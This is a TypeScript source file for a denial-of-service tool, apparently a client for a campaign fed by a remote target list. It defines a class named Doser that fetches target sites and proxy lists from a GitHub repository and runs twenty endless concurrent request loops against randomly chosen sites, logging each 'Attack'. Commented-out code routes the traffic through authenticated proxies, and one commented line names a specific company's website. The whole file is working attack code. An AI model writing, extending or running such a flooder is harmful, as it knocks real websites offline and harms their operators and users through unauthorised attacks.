import axios from 'axios-https-proxy-fix'
import fetch from "node-fetch"
// import HttpsProxyAgent from "https-proxy-agent";
import { EventEmitter } from 'events'
import {proxies1} from "./proxies/proxies1";

interface ProxyData {
  ip: string;
  auth: string;
}

interface SiteData {
  page: string;
}

interface TargetsData {
  sites: Array<SiteData>;
  proxies: Array<ProxyData>;
}

export class Doser {
  private working: boolean
  private eventSource: EventEmitter

  private loadedTargetsAndProxies: TargetsData | null = null;
  private targetsAndProxiesInterval?: NodeJS.Timer;
  // private compactRequestsArrayInterval?: NodeJS.Timer;

  // Attack settings
  private maxRequestCount = 20;

  private requestsPromises: Array<any> = [];

  constructor () {
    this.working = false;
    this.eventSource = new EventEmitter();

    // Update data repeatedly
    this.targetsAndProxiesInterval = setInterval(() => {
      this.updateTargetsAndProxies();
    }, 300000)
  }

  private async updateTargetsAndProxies() {
    try {
      const data = await this.getSitesAndProxies()
      this.loadedTargetsAndProxies = data
    } catch(e: any) {
      console.log('Unable to update data')
    }
  }

  async getSitesAndProxies (): Promise<TargetsData | null> {
    try {
      console.log('Loading targets and proxies;')
      const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
      const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })

      if (sitesResponse.status === 200 && proxyResponse.status === 200) {
        const sites: SiteData[] = sitesResponse.data as Array<SiteData>
        const proxies: ProxyData[] = proxyResponse.data as Array<ProxyData>

        console.log('Targets and proxies were loaded;')
        return {
          sites,
          proxies
        }
      } else {
        throw new Error('Bad request, cannot get targets and proxies')
      }
    } catch (e) {
      console.log('Error while loading hosts and proxies: ', e)
    }

    return null;
  }

  async start () {
    await this.updateTargetsAndProxies();

    for (let i = 0; i < this.maxRequestCount; i++) {
      this.generateRequestPromise(i).then().catch(e => console.error(e));
    }
  }

  async generateRequestPromise(promiseIndex: number) {
    if(!this.loadedTargetsAndProxies) {
      console.log('No target or proxies')
      return;
    }

    const {sites, proxies} = this.loadedTargetsAndProxies;
    const randomSite = sites[Math.floor(Math.random() * sites.length)]; //Get random site
    const randomProxy = proxies1[Math.floor(Math.random() * proxies1.length)]; //Get random proxy
    // const randomProxy = proxies[Math.floor(Math.random() * proxies.length)]; //Get random proxy
    // console.log('data:: ', randomProxy, randomSite)

    const proxyArr = randomProxy.split(':');
    const proxyIP = proxyArr[0];
    const proxyPort = parseInt(proxyArr[1]);
    const proxyUsername = proxyArr[2];
    const proxyPassword = proxyArr[3];
    // @ts-ignore
    // const proxyAgent = new HttpsProxyAgent(`http://${proxyUsername}:${proxyPassword}@${proxyIP}:${proxyPort}`);

    // const response = await fetch('https://surgutneftegas.ru/', { agent: proxyAgent});


    // const promise = axios.get(
    //   randomSite.page,
    //   {
    //     timeout: 5000,
    //     validateStatus: () => true,
    //     proxy: {
    //       host: proxyIP,
    //       port: proxyPort,
    //       auth: {
    //         username: proxyUsername,
    //         password: proxyPassword
    //       }
    //     }
    //   }
    // );

    try{
      // const result = await promise;
      const result = await fetch(randomSite.page);
      // const result = await fetch(randomSite.page, { agent: proxyAgent});
      // const body = await result.text(); // TODO Does it matter?

      console.log(`Attack: ${randomSite.page} | ${result.status}`);
    } catch(e: any) {
      console.log(`Fail: ${randomSite.page} | ${e.code} `);
    }

    this.generateRequestPromise(promiseIndex);
  }
}
